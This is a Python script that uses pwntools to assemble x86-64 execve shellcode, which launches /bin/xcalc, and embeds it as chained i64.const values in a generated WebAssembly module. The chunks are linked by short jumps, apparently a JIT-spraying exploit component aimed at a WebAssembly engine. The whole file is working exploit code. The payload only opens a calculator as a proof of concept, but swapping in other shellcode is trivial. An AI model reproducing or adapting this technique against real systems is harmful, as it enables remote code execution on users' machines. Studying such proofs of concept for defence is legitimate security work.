import pwn
import binascii
import struct

pwn.context(arch="amd64")


shellcode = []

# rdi == "/bin/xcalc"
shellcode.append(pwn.asm("xor rax, rax"))
shellcode.append(pwn.asm(f"mov ax, {int(binascii.hexlify(b'lc'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm(f"mov eax, {int(binascii.hexlify(b'/xca'[::-1]), 16)}"))
shellcode.append(pwn.asm("shl rax, 32"))
shellcode.append(pwn.asm(f"add rax, {int(binascii.hexlify(b'/bin'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm("mov rdi, rsp"))

# rsi == 0
shellcode.append(pwn.asm("xor rsi, rsi"))

# rax == "DISPLAY=:0"
shellcode.append(pwn.asm("xor rax, rax"))
shellcode.append(pwn.asm(f"mov ax, {int(binascii.hexlify(b':0'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm(f"mov eax, {int(binascii.hexlify(b'LAY='[::-1]), 16)}"))
shellcode.append(pwn.asm("shl rax, 32"))
shellcode.append(pwn.asm(f"add rax, {int(binascii.hexlify(b'DISP'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm("mov rax, rsp"))

# rdx == ["DISPLAY=:0", 0]
shellcode.append(pwn.asm("xor rbx, rbx"))
shellcode.append(pwn.asm("push rbx"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm("mov rdx, rsp"))

# rax == 0x3b (execve)
shellcode.append(pwn.asm("xor rax, rax"))
shellcode.append(pwn.asm("mov al, 0x3b"))

# syscall => execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
shellcode.append(pwn.asm("syscall"))


# chain

jmp = b"\xeb\x02"  # jmp 0x2
nop = b"\x90"
segment = b""

print(
    """(module
    (func (export \"main\")"""
)

for i in range(len(shellcode)):
    assert len(shellcode[i]) <= 6

    if len(segment) + len(shellcode[i]) < 6:
        segment += shellcode[i]
    else:
        segment = segment.ljust(6, nop)
        segment += jmp
        print(f"\ti64.const {hex(pwn.u64(segment))}")
        segment = shellcode[i]

    if i == len(shellcode) - 1:  # last
        segment = segment.ljust(8, nop)
        print(f"\ti64.const {hex(pwn.u64(segment))}")

print(
    """\treturn
    )
)"""
)
